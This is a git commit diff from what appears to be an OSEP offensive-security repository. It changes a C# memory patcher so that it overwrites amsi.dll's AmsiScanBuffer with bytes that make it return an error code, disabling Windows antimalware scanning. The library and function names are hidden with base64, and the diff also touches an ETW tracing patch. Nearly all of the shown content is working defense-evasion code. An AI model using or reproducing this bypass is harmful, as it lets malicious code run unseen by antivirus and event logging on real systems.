c9d3808c4b22a6aa1cc8478bbe904e7ae76254b1
dos-m0nk3y <dosm0nk3y@github.com>
2023-04-05 03:15:49 -0400

    Fix AMSI patch memory exception

--- OSEP/C#/patcher.cs
+++ OSEP/C#/patcher.cs
@@ -13,38 +13,13 @@ public class MemoryPatcher
         Utility.NtProtectVirtualMemory(processHandle, ref baseAddress, ref NumberOfBytesToProtect, oldAccessProtection, ref oldAccessProtection);
     }
 
-    /*
-        Amsi!AmsiOpenSession (32-bit)
-        8bff   mov  edi, edi
-        55     push rbp
-        8bec   mov  ebp, esp
-        8b4d0c mov  ecx, dword ptr [ebp+0xC]
-        85c9   test ecx, ecx
-        7439   je   amsi!AmsiOpenSession+0x45
-
-        Amsi!AmsiOpenSession (64-bit)
-        4885d2 test rdx, rdx
-        7446   je   amsi!AmsiOpenSession+0x4b
-
-        Patch assembly code for amsi.dll AmsiOpenSession
-        32-bit : test ecx, ecx => xor eax, eax
-        64-bit : test rdx, rdx => xor rax, rax
-    */
-
     public static void PatchAMSI()
     {
-        byte[] patch = IntPtr.Size == 4 ? (new byte[2] { 0x31, 0xC0 }) : (new byte[3] { 0x48, 0x31, 0xC0 });
-        IntPtr baseAddress = Utility.GetFunctionAddress("YW1zaS5kbGw=", "QW1zaU9wZW5TZXNzaW9u") + (IntPtr.Size == 4 ? 8 : 0);
+        byte[] patch = IntPtr.Size == 4 ? (new byte[8] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 }) : (new byte[6] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 });
+        IntPtr baseAddress = Utility.GetFunctionAddress("YW1zaS5kbGw=", "QW1zaVNjYW5CdWZmZXI=");
         if (baseAddress != IntPtr.Zero)
             PatchMemory(baseAddress, patch);
     }
-
-
-    /*
-        Patch assembly code for ntdll.dll NtTraceEvent to immediately execute ret
-        32-bit : ret 0x10
-        64-bit : ret
-    */
 
     public static void PatchETW()
     {
